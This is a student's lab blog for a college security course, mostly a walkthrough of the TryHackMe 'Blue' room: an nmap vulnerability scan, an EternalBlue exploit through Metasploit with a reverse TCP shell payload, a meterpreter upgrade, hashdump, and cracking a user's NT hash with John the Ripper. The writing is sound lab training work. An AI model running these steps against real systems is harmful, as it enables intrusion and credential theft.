---
layout: post
title: '               CSCI -18 LAB Blog '
published: true
---


![](hello-world/_posts/5.2.1.6.PNG)


![](/_posts/5.2.1.6.PNG)


![](../_posts/5.2.1.6.PNG)


![](./_posts/5.2.1.6.PNG)



## Jeff Hepburn - Lab Blog for CSCI - 18 @ Butte College
### Instructor: Edward Miro 


### **Public Profile for THM**

[Try Hack Me Public Profile link :](https://tryhackme.com/p/neogeo2484)

https://tryhackme.com/p/neogeo2484


### **Platform Used :**

1) Kali VM on TryHackMe.com via Google Chrome 

**##  Week 5 Lab :**

### Room Blue


_Task 1-Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not _respond to ping (ICMP) and may take a few minutes to boot up._

## Question 1: 
Scan the machine: 

### Commands and Process:****
apt install nmap 
nmap -Sv -SC--script vuln -oN blue.nmap 10.10.76.171

less blue.nmap - Vulnerable MS12-020 Remote Desktop Protocol Denial of service IDss: CVE, CVE: 2012-0152 -medium , 2017-03-14 -High SMBV1 


## Question 2 : 
135 , 139 and 445 are 3 ports open under 1000 so 3 ports are open.

## Question 3 : 
what is it vulnerable the High risk is ms17-010




_Task 2 Exploit the machine and gain a foothold._

## question 1:
_Start Metasploit_ 

msfconsole

## question 2:
_Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)_

search ms17

search eternal - found that #2 matches : exploit /windows /smb/ms17_010_eternalblue 

use 2 


## question 3:
Show options and set the one required value. What is the name of this value? (All caps for submission)

show options reveals the RHOSTS needs to be set_

## question 4:
U_sually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
With that done, run the exploit!_


set rhosts 10.10.76.171

run
or
exploit 

meterpreter 1 session opened > 



set payload windows/x64/shell/reverse_tcp


## Task 3 **Escalate privileges, learn how to upgrade shells in metasploit.**
Question 1 : 

_If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)_

post/multi/manage/shell_to_meterpreter


## Question 2:
_Select this (use MODULEPATH). Show options, what option are we required to change?_

session


## Question 3:
_Set the required option, you may need to list all of the sessions to find your target here._ 


## Question 4:
_Run! If this doesn't work, try completing the exploit from the previous task once more._



## Question 5:
_Once the meterpreter shell conversion completes, select that session for use._

## Question 6:

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

getuid 

## Question 7:

post/multi/manage/shell_to_meterpreter

run sessoion



## Task 4
Q## uestions 1
_Dump the non-default user's password and crack it!

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?_

hashdump

jon


## Question 2

_Copy this password hash to a file and research how to crack it. What is the cracked password?_

**JOHN THE RIPPER**

john jon.hash --fotmat =NT --wordlist=/opt/rockyou.txt 

john jon.hash --format=NT --show

alqfna22


## Task 5

## Question 1
_Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!_


Had to get back to Meterpeter ( my session timed out) 

## Flag 1- 
_This flag can be found at the system root._
pwd
cd..
cd..
pwd 


in the C:\windows 
ls
ls


cd windoes 

## flag 2
*_Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen._


## flag 3
_flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved_. 










           **## THM LABS__**###













**##  Week 4 Lab :**



## :Link 1 Documentation:
### Room : Welcome
https://tryhackme.com/room/welcome
Room is Private - However on the Dashboard there are 3 Welcome Tasks- 
What are rooms ?
deploy machine and go to ip address in firefox
find flag 
flag{connection_verified}
check out other pathways and rooms within THM. 




## :Link 2 Documentation:
### Room : Tutorial
https://tryhackme.com/room/tutorial

Deploy My first Machine 
Open Machine Info - Copy IP and paste into Firefox 
10.10.38.0
Deploy attackbox and go to IP above to find flag
flag{connection_verified}

more next step info



## :Link 3 Documentation:
### Room : OpenVpn


Download your VPN configuration file

Run through all the different OS and how to access their VM on those OS or Run Open VPN-

Open VPN GUI download

Open and Run connect from local file 
Find Ip address and connect  then verify connection on 
Test connection by deploying machine and going to IP address listed to find the flag 

Enter flag
Flag{connection_verified}

Complete room.
